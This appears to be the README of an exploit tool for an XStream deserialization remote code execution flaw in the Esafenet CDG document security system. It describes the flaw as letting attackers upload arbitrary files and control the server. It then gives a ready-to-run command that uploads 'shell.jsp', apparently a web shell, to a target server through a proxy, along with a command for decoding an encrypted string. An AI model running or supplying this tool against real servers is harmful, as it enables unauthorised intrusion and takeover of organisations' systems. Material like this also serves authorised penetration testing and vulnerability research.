# CDGXStreamDeserRCE

> 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全防护软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产。亿赛通电子文档安全管理系统存在XStream反序列化远程代码执行漏洞，攻击者可利用该漏洞对服务器上传任意文件，进而控制服务器权限。


## 使用

本地文件上传利用

```bash
java -jar CDGXStreamDeserRCE.jar -t http://192.168.1.1:8443 -uf shell.jsp -p http://127.0.0.1:8080
```

密文解码

```bash
java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
```

## References

- https://github.com/woodpecker-framework/ysoserial-for-woodpecker